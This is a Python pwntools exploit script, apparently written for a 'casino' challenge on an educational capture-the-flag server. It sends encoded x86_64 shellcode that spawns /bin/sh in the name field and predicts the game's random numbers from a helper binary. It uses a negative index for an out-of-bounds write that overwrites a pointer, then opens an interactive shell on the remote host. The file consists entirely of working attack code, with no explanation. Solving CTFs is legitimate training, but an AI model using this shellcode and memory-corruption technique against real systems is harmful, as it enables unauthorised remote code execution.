# Please run with python2.7 for better compatibility
from pwn import *

# shellcode
context.clear(arch='x86_64')
sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
# sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
sc = b'\x00' * 64 + sc
print('sc ', sc)

# random number
p = process("./gen_num.out")
numbers = p.recvall().decode().split('\n')
del numbers[-1]
p.close()

# send
# r = process("./casino")
# elf = ELF("./casino")
r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', sc)
r.sendlineafter('age: ', '40')

# offset = -160 / 4
offset = -176 / 4

for cnt_try in range(0, 2):
    cnt_num = 0
    print('round ', cnt_try)
    if cnt_try == 1:
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            print('sending number ', i)
            cnt_num += 1
    elif cnt_try == 0:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            print('sending number ', i)
            cnt_num += 1

    r.sendlineafter('0:no]:', '1')

    if cnt_try == 1:
        #raw_input()
        r.sendlineafter('6]:', str(offset + 2))
        print('finished sending offset', str(offset + 2))

        r_out = 'Chose the number ' + str(offset + 1) + ': '
        r.sendlineafter(r_out, '0')
    elif cnt_try == 0:
        r.sendlineafter('6]:', str(offset + 1))
        print('fffffinished sending offset ', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) + ': '
        r.sendlineafter(r_out, '6299952')

r.interactive()
r.close()
